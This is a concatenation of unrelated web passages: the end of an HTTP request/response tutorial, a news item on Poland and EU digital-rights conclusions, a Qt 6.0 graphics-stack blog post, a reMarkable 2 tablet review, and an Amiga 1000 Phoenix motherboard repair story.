{"people":"http://swapi.dev/api/people/","planets":"http://swapi.dev/api/planets/","films":"http://swapi.dev/api/films/","species":"http://swapi.dev/api/species/","vehicles":"http://swapi.dev/api/vehicles/","starships":"http://swapi.dev/api/starships/"}
</code></pre></div></div>

<p>Like with the request, all lines are separated by <code>\r\n</code>, and the empty line is how we know where the headers stop and the body begins. The only other difference is that the first line now has an integer <a href="https://en.wikipedia.org/wiki/List_of_HTTP_status_codes">status code</a> and a textual description of the code’s meaning.</p>

<p>Like with request methods, there’s no real limit on the status code values and message. The HTTP spec defines many that we’re familiar with, such as <code>200</code> (OK) and <code>404</code> (Not Found), as well as the allowed range of numbers (100 … 599). But… you <em>could</em> return a <code>666 Diabolical</code> code, or <code>42 Mostly Harmless</code> code. You could even return a <code>200 👍</code> response. But please don’t. 😅</p>

<p>The body, again, is raw binary data and it’s up to the recipient to correctly interpret it. The Star Wars API body is JSON-encoded text, but a body can just as easily be the raw bytes of a <code>.jpg</code> file, or the XML bytes of an RSS feed, or the text that describes an <a href="https://en.wikipedia.org/wiki/M3U">HTTP live streaming playlist</a>.</p>

<h2 id="putting-it-together">Putting it together</h2>

<p>That’s an overview of HTTP requests and responses. This simple model describes the fundamental communications used by most of the internet. It doesn’t cover things like web sockets or push notifications, but this is used by every website and most network APIs. Knowing the details of how this works continues to be one of the most valuable and consistently useful things I know and use as a software engineer.</p>

<p>In the next post, we’ll take a look at how we move from this specification to the basic structures we’ll need for our framework.</p>

<p><strong>Ambassador says government supports equality but ‘gender’ is poorly defined in EU law</strong></p>
<p>Poland’s&nbsp;government was the only one in the Council of the EU that opposed adopting draft conclusions on digital technologies and fundamental rights earlier this week, Research Professional News can reveal. A spokesperson for the government said it did so over the inclusion of the term ‘gender’ in the document.</p>
<p>The conclusions, published on 21 October, refer to the opportunities and problems that artificial intelligence poses for gender equality, and say the EU will cooperate with the human rights body the Council of Europe to promote gender equality.</p>				</section>

                                Monday October 26, 2020 by <a href="https://www.qt.io/blog/author/laszlo-agocs">Laszlo Agocs</a> | <a href="#commento">Comments</a>
                            </p>
                            
                            <p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>Last year we had a three part blog series about Qt's new approach to working with 3D graphics APIs and shading languages: <a href="https://www.qt.io/blog/qt-quick-on-vulkan-metal-direct3d">part 1</a>, <a href="https://www.qt.io/blog/qt-quick-on-vulkan-metal-and-direct3d-part-2">part 2</a>, <a href="https://www.qt.io/blog/qt-quick-on-vulkan-metal-and-direct3d-part-3">part 3</a>. For <a href="https://doc-snapshots.qt.io/qt6-dev/qtquick-index.html">Qt Quick</a>, an early, opt-in preview of the new rendering architecture was shipped in Qt 5.14, with some improvements in Qt 5.15. With the release of Qt 6.0 upcoming, let's see what has happened since Qt 5.15. It will not be possible to cover every detail of the graphics stack improvements for Qt Quick here, let alone dive into the vast amount of Qt Quick 3D features, many of which are new or improved in Qt 6.0. Rather, the aim is just to give an overview of what can be expected from the graphics stack perspective when Qt 6.0 ships later this year.</p>
<p>Note that the documentation links refer to the Qt 6 snapshot documentation. This allows seeing the latest C++ and QML API pages, including all changed and new functions, but the content is also not final. These links may also break later on.</p>
<!--more-->
<h2>QRhi improvements</h2>
<p>QRhi, the Qt Rendering Hardware Interface, is Qt's internal graphics abstraction when 3D APIs, such as OpenGL, Vulkan, Metal, and Direct 3D, are involved. Compared to 5.15, the main improvements in 6.0 are a lot of polishing fixes here and there, and, most importantly, a large set of performance optimizations. While benefitting Qt Quick as well, these become especially important with Qt Quick 3D when complex scenes with many renderable objects are involved.</p>
<p>With some simplifications, the main layers of the Qt 6.0 graphics stack can be visualized like this:</p>
<p><img src="https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=800&amp;name=rhiarch-3.png" alt="rhiarch-3" width="800" srcset="https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=400&amp;name=rhiarch-3.png 400w, https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=800&amp;name=rhiarch-3.png 800w, https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=1200&amp;name=rhiarch-3.png 1200w, https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=1600&amp;name=rhiarch-3.png 1600w, https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=2000&amp;name=rhiarch-3.png 2000w, https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=2400&amp;name=rhiarch-3.png 2400w" sizes="(max-width: 800px) 100vw, 800px"></p>
<h2>Shader management</h2>
<p>The Qt Shader Tools module is now a selectable module in the installer. For applications this can be relevant because this is the module that provides the <em>qsb</em> command-line tool (not to be confused with <em>qbs</em>) and its associated CMake build system integration. In addition, the module is a mandatory dependency for Qt Quick 3D at the moment.</p>
<p>Qt 6 no longer uses OpenGL-compatible GLSL source snippets directly. Rather, shaders are all written in Vulkan-style GLSL, then reflected and translated to other shading languages, and finally packaged up into a serializable QShader object that can be consumed by QRhi. The shader preparation pipeline in Qt 6 is the following:</p>

<p>In QML applications using Qt Quick, whenever working with ShaderEffect, or subclassing QSGMaterialShader, the application will need to provide a baked shader pack in form of a .qsb file. These are generated by the <em>qsb</em> tool. This does not however mean that developers have to start dealing with a new tool directly: with the CMake integration one can easily list the vertex, fragment, and compute shaders in CMakeLists.txt via the qt6_add_shaders() CMake function. Invoking qsb and packing the resulting .qsb files into the Qt resource system is then taken care of by the build system.</p>
<p>See <a href="https://doc-snapshots.qt.io/qt6-dev/qtshadertools-index.html">the shadertools documentation</a> for an overview of how graphics and compute shaders are handled in Qt 6 and the details of the qsb tool and its CMake integration.</p>
<h2>Direct OpenGL is no more for Qt Quick</h2>
<p>In Qt 5.14 and 5.15, Qt Quick shipped with an optional QRhi-based rendering path that could be enabled by setting the environment variable <em>QSG_RHI</em>. This allowed painless experimenting with the new stack, while keeping the traditional, battle tested direct OpenGL code path the default.</p>
<p>In Qt 6.0 all such switches are gone. There is no way get rendering go directly to OpenGL with Qt Quick scenes. Rather, the new default is the QRhi-based rendering path of the Qt Quick scene graph. Other than the defaults changing, the ways to configure what QRhi backend, and so which graphics API to use are mostly unchanged compared to Qt 5.15. See <a href="https://doc-snapshots.qt.io/qt6-dev/qtquick-visualcanvas-scenegraph-renderer.html#rendering-via-the-qt-rendering-hardware-interface">the documentation</a> for details. One difference is better API naming: in C++ code to request, and so effectively tie the application to, a given QRhi backend (and by extension graphics API) is now done through the <a href="https://doc-snapshots.qt.io/qt6-dev/qquickwindow.html#setGraphicsApi">QQuickWindow::setGraphicsApi()</a> function, whereas in 5.15 this task used to be pushed onto an overload of setSceneGraphBackend(), leading to fairly inaccurate naming.</p>
<p>There are a number of implications, although many applications will not notice any of these. If an application uses neither shader code (ShaderEffect, QSGMaterial) nor does it perform its own rendering with OpenGL directly, there is a very high chance that it will need no migration steps at all. (at least not because of graphics)</p>
<h4>Applications using OpenGL directly</h4>
<p>What about applications that use OpenGL directly in one way or another, and are not interested in functioning with other graphics APIs? For example, applications that use <a href="https://doc-snapshots.qt.io/qt6-dev/qquickframebufferobject.html">QQuickFramebufferObject</a>, or connect to signals like <a href="https://doc-snapshots.qt.io/qt6-dev/qquickwindow.html#beforeRendering">QQuickWindow::beforeRendering()</a> to inject their own OpenGL rendering under or above the Qt Quick scene. This is when the setGraphicsApi() function mentioned above comes into play for real: if an application wishes, it can always state that it wants OpenGL (or Vulkan, or Metal, or D3D) only, and nothing else. That way it is guaranteed that Qt Quick is going to use the corresponding QRhi backend (or else it will fail to initialize), so the application can safely assume that going directly to OpenGL is safe, because Qt Quick will also end up rendering through OpenGL. Note that this does not exempt the application from having to do other type of porting steps: for example, if it in addition uses ShaderEffect or creates its own custom materials, it will still need to migrate to the new ways of handling shaders and materials.</p>
<h4>QSG* and QQuick* API changes</h4>
<p>The API changes mainly fall into 3 categories. This is not going to be an exhaustive list, but rather just a peek at some of the important changes. Detailed change lists and porting guides are expected to be available with the final Qt 6.0 release.</p>
<ul>
<li>
<div><p>Different approach to shaders and materials: <a href="https://doc-snapshots.qt.io/qt6-dev/qsgmaterialshader.html">QSGMaterialShader</a> received a full revamp (matching more or less what the now-removed QSGMaterialRhiShader used to be in 5.14 and 5.15). <a href="https://doc-snapshots.qt.io/qt6-dev/qml-qtquick-shadereffect.html">ShaderEffect</a> no longer allows inline shader strings. Rather, the vertexShader and fragmentShader properties are URLs, similarly to <span>Image.source</span> and others. They can refer to a local .qsb file, or a .qsb file embedded via the Qt resource system (qrc).</p></div>
</li>
<li>
<p>Removing OpenGL-specifics from QQuickWindow, QSGTexture, and elsewhere. It should come as no surprise that functions like <em>GLuint textureId()</em>, <em>createTextureFromId(GLuint textureId, ...)</em>, or <em>setRenderTarget(GLuint fboId)</em> are now gone. Adopting (wrapping) an existing OpenGL texture, Vulkan image, Metal texture, or D3D11 texture, or accessing the underlying native texture for a QSGTexture is still perfectly possible, but now is done via a different set of APIs, such as <a href="https://doc-snapshots.qt.io/qt6-dev/qnativeinterface-qsgvulkantexture.html">QSGVulkanTexture</a> and the <a href="https://doc-snapshots.qt.io/qt6-dev/qnativeinterface-sub-qtquick.html">other similar classes</a>, instances of which are <a href="https://doc-snapshots.qt.io/qt6-dev/qsgtexture.html?__hstc=233546881.8510e053e4fb66e1a58543a6e9886427.1603454017210.1603454017210.1603454017210.1&amp;__hssc=233546881.1.1603454017210&amp;__hsfp=1285229618#nativeInterface" rel="noopener">queryable from QSGTexure</a>.</p>
<ul>
<li>
<div><p>Integrating the application's own custom rendering with the graphics API that Qt Quick renders with is fully supported, not just for OpenGL, but also Vulkan, Metal, and D3D11. Due to their nature however, some of these APIs will need more than connecting to one single signal like beforeRendering() or afterRendering(). For example, we now also have <a href="https://doc-snapshots.qt.io/qt6-dev/qquickwindow.html#beforeRenderPassRecording">beforeRenderPassRecording()</a>. See the relevant section in the <a href="https://doc-snapshots.qt.io/qt6-dev/qtquick-visualcanvas-scenegraph.html#mixing-scene-graph-and-the-native-graphics-api">scenegraph overview docs</a> for more details and links to examples. Finally, the number of native graphics resources queryable via <a href="https://doc-snapshots.qt.io/qt6-dev/qsgrendererinterface.html">QSGRendererInterface</a> has been extended, now covering Vulkan, Metal, and Direct 3D too.</p></div>
</li>
</ul>
</li>
<li>
<p>Extending support for redirecting the Qt Quick scene into an offscreen render target. <a href="https://www.qt.io/blog/%3Ehttps://doc-snapshots.qt.io/qt6-dev/qquickrendercontrol.html">QQuickRenderControl</a> and the related infrastructure has been heavily enhanced. This was done not just to enable working with graphics APIs other than OpenGL the same way as in Qt 5 (for example, to render a Qt Quick scene into a Vulkan VkImage without an on-screen window), but also to enable integration with AR/VR frameworks and APIs such as <a href="https://www.khronos.org/openxr/">OpenXR</a> (in combination with any of Vulkan, D3D11, or OpenGL). Besides the slightly changed QQuickRenderControl interface, we now have a number of helper classes that improve the configurability of a QQuickWindow: <a href="https://doc-snapshots.qt.io/qt6-dev/qquickrendertarget.html">QQuickRenderTarget</a>, <a href="https://doc-snapshots.qt.io/qt6-dev/qquickgraphicsdevice.html">QQuickGraphicsDevice</a>, and <a href="https://doc-snapshots.qt.io/qt6-dev/qquickgraphicsconfiguration.html">QQuickGraphicsConfiguration</a>. These are essential in scenarios where a more fine grained control is needed: integrating with APIs like OpenXR is not always straightforward when an existing rendering engine is involved, with a number of potential chicken-egg problems when it comes to the creation, initialization, and ownership of instance, device, and other graphics objects: Which Vulkan instance should Qt Quick use, or should it create a new one upon initializing the scenegraph for the first time? Which Vulkan physical device or DXGI adapter should Qt Quick pick, or just stay with the default? Which VkDevice extensions should be enabled in addition to what Qt itself needs? What 2D image/texture should rendering target, who creates that and when? The expectation is that Qt 6.0 will be well-prepared and providing the foundations for further exploring the world of AR/VR during the rest of the Qt 6.x series.</p>
</li>
</ul>
<h4>New approach to handling shader code in ShaderEffect</h4>
<p>A comprehensive example of the new approach to shader code in ShaderEffect is the Qt 6 port of the classic Qt 5 Cinematic Experience demo. <a href="https://github.com/alpqr/qt5-cinematic-experience" rel="noopener">(GitHub repo)</a> This version is ported to CMake and is fully functional with all graphics APIs, including all shader and particle effects.</p>
<p><img src="https://www.qt.io/hs-fs/hubfs/cinematic.png?width=702&amp;name=cinematic.png" alt="cinematic" width="702" srcset="https://www.qt.io/hs-fs/hubfs/cinematic.png?width=351&amp;name=cinematic.png 351w, https://www.qt.io/hs-fs/hubfs/cinematic.png?width=702&amp;name=cinematic.png 702w, https://www.qt.io/hs-fs/hubfs/cinematic.png?width=1053&amp;name=cinematic.png 1053w, https://www.qt.io/hs-fs/hubfs/cinematic.png?width=1404&amp;name=cinematic.png 1404w, https://www.qt.io/hs-fs/hubfs/cinematic.png?width=1755&amp;name=cinematic.png 1755w, https://www.qt.io/hs-fs/hubfs/cinematic.png?width=2106&amp;name=cinematic.png 2106w" sizes="(max-width: 702px) 100vw, 702px"></p>
<p>Looking at the QML source code, for example the code for the <a href="https://github.com/alpqr/qt5-cinematic-experience/blob/master/content/CurtainEffect.qml" rel="noopener">curtain effect </a>shows that indeed it has all inline GLSL strings removed.</p>
<p><img src="https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-22-47-14-PM.png?width=354&amp;name=image-png-Oct-19-2020-12-22-47-14-PM.png" width="354" srcset="https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-22-47-14-PM.png?width=177&amp;name=image-png-Oct-19-2020-12-22-47-14-PM.png 177w, https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-22-47-14-PM.png?width=354&amp;name=image-png-Oct-19-2020-12-22-47-14-PM.png 354w, https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-22-47-14-PM.png?width=531&amp;name=image-png-Oct-19-2020-12-22-47-14-PM.png 531w, https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-22-47-14-PM.png?width=708&amp;name=image-png-Oct-19-2020-12-22-47-14-PM.png 708w, https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-22-47-14-PM.png?width=885&amp;name=image-png-Oct-19-2020-12-22-47-14-PM.png 885w, https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-22-47-14-PM.png?width=1062&amp;name=image-png-Oct-19-2020-12-22-47-14-PM.png 1062w" sizes="(max-width: 354px) 100vw, 354px"></p>
<p>Instead, the vertex and fragment shaders now live as <a href="https://github.com/alpqr/qt5-cinematic-experience/tree/master/shaders" rel="noopener">ordinary files in the source tree</a>, not bundled with the application executable anymore.</p>

<p>It is now up to the build system and Qt Shader Tools to compile, reflect, and translate at build time - with the added benefit of shader compilation errors becoming proper build errors instead of …</p></span></p></div></div>

	<section>
		<p>I am a notorious note-taker. Over the years, I've learned not to rely solely on my (or anyone else's) memory but to create well structured, concise, and adequately labeled notes for future use. It's not only required to preserve the knowledge, but it helps you develop some valuable abilities &amp; skills, e.g.:</p><ul><li>synthesis of information</li><li>clarity of thought</li><li>proper application of mental models</li><li>crafting a visual structure that carries the supplementary information</li><li>sketching :)</li></ul><p>I've tried various techniques of note-taking. Friction-less apps like Bear, personal knowledge management tools like Notion, audio recorders like Otter, outlining tools like Workflowy, Zettelkasten-inspired research tools like Roam or Obsidian. All of them have their pros, I still use some of them daily for specific purposes (Notion, Roam), but none of them has beaten the <strong>fundamental advantages</strong> of a thin sheet of paper:</p><ul><li>minimum latency (&amp; inertia)</li><li>maximum flexibility (when it comes to notation &amp; form - nothing is enforced)</li></ul><p>Obviously, <strong>paper has its flaws</strong> as well:</p><ul><li>it's immutable</li><li>digitizing it is a manual, cumbersome process</li><li>full freedom of what you draw/write/scribble is fantastic, but sometimes it would save a lot of time to have a library of stencils/templates</li><li>inventorizing the notes properly (so they're searchable/navigable in scale) is not easy</li><li>making cross-content references is also a pain</li></ul><p>Is it possible to have a solution <strong>with the advantages of paper but devoid of its flaws</strong>? In my quest to answer this question, I've decided to reach for an e-ink tablet named <a href="https://remarkable.com/store/remarkable-2">reMarkable 2</a>.</p><hr><p>It's the 2nd iteration of that concept. I was considering a purchase of the previous generation one, but in the end, I've passed because of the high price and moderately enthusiastic reviews on the Internet. According to its creators' declaration, the new edition is supposed to fix its predecessor's flaws. And the price tag is much more wallet-friendly.</p><p>So in the end I've decided to give it a go. The production and delivery cycle has been delayed due to COVID-19 (by two months), but I've finally received my device, used it for few weeks, and can now provide you my initial review.</p><figure><img src="https://no-kill-switch.ghost.io/content/images/2020/10/remarkable_2.jpg" alt="" srcset="https://no-kill-switch.ghost.io/content/images/size/w600/2020/10/remarkable_2.jpg 600w, https://no-kill-switch.ghost.io/content/images/2020/10/remarkable_2.jpg 800w" sizes="(min-width: 720px) 720px"></figure><p>Before I dive into the actual details - what precisely did I order? Apart from the tablet itself (there's just one model, no options/variants), I've picked the marker (more expensive version - with the eraser) and a folio case (opens like a book, covers full tablet).</p><p>I'll spare you all the specification details - screen density, dimensions, weight, etc. - you can find all of those at the manufacturer's site. I'd like to focus on impressions &amp; conclusions only.</p><p>IMHO the hardware quality is on par with <strong>Amazon Kindle Oasis 2</strong> - the e-book reader I use daily for a long time. Solid, sturdy, durable, thin &amp; aesthetic. No cheap plastic elements. The only visible differences between Oasis and reMarkable 2 (except for the size) are the lack of screen backlight and turn-page buttons. </p><p>Additional observations:</p><ol><li>the screen is not automatically turned on/off when closing the folio case - TBH I don't find it a significant flaw</li><li>the marker is attached magnetically to the side of the tablet - it snaps precisely, exactly when expected, and it doesn't drop off randomly - zero complaints here</li></ol><hr><p>Marker is not required to use reMarkable 2, but TBH using the tablet w/o it kind of misses the whole point. It's supposed to be <strong>a note-taking device, not an e-book reader</strong>. You've been probably waiting for that, so I'm not stalling anymore: the marker works surprisingly well - both accuracy and latency are more than acceptable:</p><ul><li>I don't remember getting frustrated that the effect of my scribbling doesn't match my intent (<u>precision</u>)</li><li>the <u>feedback</u> is nearly instantaneous - I didn't have a feeling I'm intentionally slowing down (writing or scribbling) to compensate for any device's speed deficiencies</li><li>the speed (of a move, while marker touches the surface) doesn't affect the <u>accuracy</u> (fluidity) - lines remain continuous, without gaps or other inaccuracies</li></ul><figure><img src="https://no-kill-switch.ghost.io/content/images/2020/10/remarkable_5.jpg" alt="" srcset="https://no-kill-switch.ghost.io/content/images/size/w600/2020/10/remarkable_5.jpg 600w, https://no-kill-switch.ghost.io/content/images/2020/10/remarkable_5.jpg 800w" sizes="(min-width: 720px) 720px"></figure><p>Btw. the marker has a removable rod at its tip - that's the only surface that touches the screen when scribbling. I can't tell how quickly it wears out, but you get a few spare ones as replacements. So far, I didn't notice any scratches on the e-ink screen - let's hope it stays that way.</p><p>My marker (the more expensive version) theoretically works like a pencil with an eraser at the opposite end. That's the theory - in practice, it turns out that you can't rub (to erase), but you need to poke. It's not only unintuitive but also quite slow. However - it works.</p><p>Overall, reMarkable 2 hardware doesn't disappoint - it provides <u><strong>a solid base to meet expectations</strong></u>, but TBH there was no <em>"wow effect"</em> - I didn't have a feeling of handling a breakthrough <em>"next-gen"</em> device.</p><p>There are three pieces of software to evaluate pretty much independently:</p><ol><li>Tablet firmware</li><li>PC companion app</li><li>Chrome extension</li></ol><h3 id="tablet-firmware">Tablet firmware</h3><p>Needless to say, good hardware is crap w/o decent software (on the device). Surprisingly reMarkable 2 <strong>doesn't shine here</strong>. Tablet's software is very minimalistic (which is not an issue <em>per se</em>) - you can read e-books and make notes, but the software doesn't do much to improve/expand the experience:</p><ul><li>no dictionaries/Wiki support</li><li>no bookmarking/indexing</li><li>three colors (black, one shade of grey, white) for note-taking :(</li><li>the surface for scribbling is fixed (forget about infinite whiteboard ...) and in fact rather small (but you can easily add more sheets, of course)</li><li>OCR functionality is limited - whole page or nothing</li><li>there's zero integration with popular note-taking tools/platforms (like Evernote or OneNote) - all you can do is to export to image formats like PNG</li></ul><figure><img src="https://no-kill-switch.ghost.io/content/images/2020/10/remarkable_4.jpg" alt="" srcset="https://no-kill-switch.ghost.io/content/images/2020/10/remarkable_4.jpg 600w"></figure><p>Unfortunately, I've encountered <strong>few bugs/inconsistencies</strong> as well:</p><ol><li>there were misleading synchronization messages (<em>"failed but succeeded"</em> style of communication ;P)</li><li>once I've tried to change font settings for an article sent via Chrome extension (it was a part of Apache Arrow specification), the device started rebooting repeatedly (about five times) - I was able to replicate the issue</li></ol><hr><p>But to be honest, there are <strong>some pros worth mentioning</strong> as well:</p><ol><li>You can scribble over your e-books (!) - underline, highlight, add comments on margins. It works like a charm, is very convenient, but TBH I didn't check how foolproof it is (e.g., what happens with the notes if I adjust margin settings, so page numeration changes ...).</li><li>There's a nice variety of "pens" available - ones that imitate pencils, brushes, highlighters, or markers - I find the selection wide enough for my needs.</li><li>It's possible to add transparent layers, so you can scribble on one without affecting others.</li><li>One can also use one of many available templates (stencils) for the full pages (only): tables, grids, checklists, organizers, even perspective "helpers" or guitar chord sheets.</li><li>Selecting content is super-convenient - you just draw a shape around an item ("magic lasso" style), and then you can scale, rotate or cut the selection.</li><li>You need to get used to erasing stuff - it's impossible to "select" elements by "clicking"; you need either to use the selection tool or the opposite tip of your marker (if you have the expensive version).</li></ol><figure><img src="https://no-kill-switch.ghost.io/content/images/2020/10/remarkable_3.jpg" alt="" srcset="https://no-kill-switch.ghost.io/content/images/size/w600/2020/10/remarkable_3.jpg 600w, https://no-kill-switch.ghost.io/content/images/2020/10/remarkable_3.jpg 800w" sizes="(min-width: 720px) 720px"></figure><h3 id="pc-companion-app">PC companion app</h3><p>What about the PC companion app? I've tried the Windows version, and it ... just works. Its primary purpose is to upload e-books, and it does it in quite a convenient way - you don't need to plug the device to your PC (with USB cable), because it sends the e-book over the Internet.</p><p>When it comes to e-books, two formats are supported: PDF and epub. I have literally zero complaints regarding PDFs - due to the larger screen, the user experience (of reading PDF) was much more pleasant than with <strong>Amazon Kindle Oasis 2</strong>. But my epubs were rendered poorly, like if someone has stripped all the formatting and converted the rich text to raw text. Frankly, I can't tell whether it's the issue with epub format or reMarkable 2, because I've never used epub before (only mobi), but the effect was disappointing anyway.</p><h3 id="the-browser-extension">The browser extension</h3><p>The browser extension is available only for Chrome (sadly). All it does is send whatever page you're reading to your reMarkable 2 as either raw text or PDF (it uses PDF print functionality built into Chrome). I've already mentioned issues with changing font settings for raw text articles. Hopefully, this gets fixed soon.</p><p>I guess it's time to round things up.</p><p><strong>reMarkable 2</strong> is a great piece of hardware that needs some improvement of the software powering it. I dreamed of using it as a minimum-friction note-taking <em>"front-end"</em> for powerful knowledge management platforms I use, but it's very cumbersome at this point. It's a standalone device, <strong>reMarkable 2</strong> isn't even trying to either attach to any existing app ecosystem or creating its own (challenger) one.</p><p>That's a big disappointment. But I believe that CAN be fixed; the potential is still there.

Here are some ideas:</p><ol><li>OCR for selection - replaces scribbling (in-place) with recognized text</li><li>Import/export from popular knowledge management tools</li><li>Remove the fixed boundaries of quick notes scribbling space (make it "virtually infinite")</li><li>Casting/transmitting the content of the device e.g. to computer screen in real-time (e.g. to present for the larger audience or just collaborate remotely)</li><li>Stencil library for shapes (e.g. sticky notes, basic icons, elements of the most popular visual notations)</li><li>Better UX for syncing stuff (on the tablet) - e.g. force sync button</li></ol><p>What I think is beyond the capabilities of reMarkable 2 (even with regular software updates)?</p><ol><li>More colors (I don't believe they've reduced it to 3 for kicks and giggles ...)</li><li>"Objectualizing" parts of the note and adding dynamic connectors between them (e.g. flows, arrows, lines) that adjust when objects are moved</li></ol><hr><p><strong>So, was it worth it (the price tag)?</strong></p><p>I honestly can't tell at this point.

<p>… or failures are your friends :&gt;</p>
<p>&lt;INTRO&gt;</p>
<figure><img src="https://i0.wp.com/imgur.com/xzJXBgG.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/xzJXBgG.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>&lt;/INTRO&gt;</p>
<p>The story behind this whole post is a bit lengthy but I’ll try to be brief 🙂</p>
<p>In August of 2019, I’ve received an email from MrTrinsic. Back then, I didn’t yet know what is coming lol.</p>
<p>It turned out that MrTrinsic is a great Amiga enthusiast and he’d asked me to work on his Amiga 1000 … but no on a standard A1000 but with an Amiga 1000 Phoenix motherboard!</p>
<p>Amiga 1000 Phoenix Enhanced mobo is an extremely rare motherboard replacement for Amiga 1000. Some people think there were no more than 200 units manufactured, others say it was no more than 2000. I’ve no idea either but still, it is very rare so a magic smoke is not an option lol.</p>
<p>This motherboard is an awesome hack in itself and that is why MrTrinsic refers to it as DIVA 😀</p>
<p>Let me quote an excerpt from one of emails.</p>
<p><em>You should mention or point out more clearly that the Phoenix Board is a … DIVA!<br>It is a hack. Just look at the manual what kind of things you can modify and what kind of headers there are to change stuff.<br>The price is that it has an extremely bad signal quality. Plus, it lacks the Buster-Chip that the Amiga 2000 has.<br>The Phoenix is a bad version of the original A2000 from Braunschweig, which in itself was a hacked and beefed-up version of the A1000.<br>Plus, the Phoenix only has two layers. It’s a nightmare as we have seen.</em></p>
<p>It simply always has some problems like stability and compatibility issues which I’ve tried to sort out.</p>
<p>Phoenix mobo was developed in 1989/1990 by our fellow friends from Australia and was one of the very first crowd-funding campaigns! You can read/watch more on one of my fav websites -&gt; <a rel="noreferrer noopener" href="https://www.amigalove.com/viewtopic.php?t=476" target="_blank">www.amigalove.com</a></p>
<p>Hardware specs are available here -&gt;<a rel="noreferrer noopener" href="https://amiga.resource.cx/exp/phoenix" target="_blank"> amiga.resource.cx</a></p>
<h4>The plan</h4>
<p>Initially, MrTrinsic asked me to work on some external floppy replacements by Dell which I will cover in another post. Once I’ve figured out that floppy drive issue he’d decided we should start working on The Phoenix project.</p>
<p>At first, he’d send me a large box with gear that he wanted to have in this Amiga. I was like OMG! Not only Phoenix but the whole large project was about to begin!</p>
<p>The plan was to run lots of modern hardware add-ons with Amiga 1000 Phoenix and later try to squeeze it into a nice looking case, plus make it alive and stable.</p>
<p>The first package arrived and I was really excited by what I’ve seen.</p>
<p>Amiga 1000 Phoenix in an A1000 case with lots of mods and hacks already installed, plus, tons of other hardware mods still in boxes … and that was only for starters …</p>

<p>Obviously, the original plan was to MAKE Amiga 1000 Phoenix GREAT AGAIN!</p>
<p>Jokes aside, the main goal was to run a graphics card along with <a href="http://wiki.icomp.de/wiki/ACA500plus" target="_blank" rel="noreferrer noopener">ACA500plus</a> + <a href="http://wiki.icomp.de/wiki/ACA1233n" target="_blank" rel="noreferrer noopener">ACA1233n</a> accelerator card by iComp</p>
<p>On top of tons of other minor hardware mods, He’d also sent me two graphic cards – <a rel="noreferrer noopener" href="https://shop.mntmn.com/products/zz9000-for-amiga-preorder" target="_blank">ZZ9000 by MNT</a> and GBAPII++ by KryoFlux.</p>

<figure><img src="https://i1.wp.com/imgur.com/dg6QzfV.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/dg6QzfV.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<h4>Running it</h4>
<p>First things first. Phoenix motherboard is so rare that I first had to learn how it works and how it is all connected etc.</p>
<p>As it gave me a black screen at the very first run, I had to start learning about jumper settings and the board in general</p>
<p>Below, you can see a block diagram of particular parts location to give you an idea of what is where.</p>
<figure><img src="https://i0.wp.com/imgur.com/1Dz8Jbp.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/1Dz8Jbp.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>Of course, I would not move on quickly without MrTrinsics support. He’d pointed me to several sites and sent over some more info about the board itself. One of the most important documents I’ve received was <a rel="noreferrer noopener" href="https://retrohax.net/wp-content/uploads/2020/10/phoenix_jumpers_english.pdf" target="_blank">the jumper settings file</a> along with the <a rel="noreferrer noopener" href="https://retrohax.net/wp-content/uploads/2020/10/Phoenix.pdf" target="_blank">original manual</a>.</p>
<p>The above documents gave me the general idea of how things should work. The very first thing that I did was the removal of all added mods. I’ve then tried to run the A1K but still no luck – black screen. MrTrinsic then pointed me to jumper L35 which could cause such behavior if set incorrectly and bingo! It worked! </p>
<p>Since Phoenix has slots for more than one ROM chip, it is possible to install three KickStarts – 1.3. and 3.1 and third as a custom option. That was already done, along with a switch hack.</p>

<p>The problem was that Amiga wasn’t starting every single time. Instead, it booted every couple of times. My next move was to take it out and try running it outside of the case. This is where I’ve started noticing all the awesome texts on the PCB itself. I took PCB out started shooting pics of those texts and greetz for various hackers of that era.</p>

<p>Next, I’ve checked for any obvious problems and when I was happy with this inspection, I’ve put it back to a case to simply avoid any accidental short circuits caused by beer-drinking ;P</p>
<p>I’ve decided that I will try to run it with only Indivision ECS2, and KryoFlux GBAPII++ inserted.</p>
<p>I’ve then located the switch setting for the first ROM and put an awesome<a href="http://www.diagrom.com/" target="_blank" rel="noreferrer noopener"> DiagROM by John “<em>Chucky</em>” Hertell</a> in a socket. Yeah, I know, it is a quite a large resistor ;P</p>
<figure><img src="https://i2.wp.com/imgur.com/1Xs3Ren.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/1Xs3Ren.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>To my surprise, it worked flawlessly and I was greeted by a known diag info and a menu a bit later.</p>

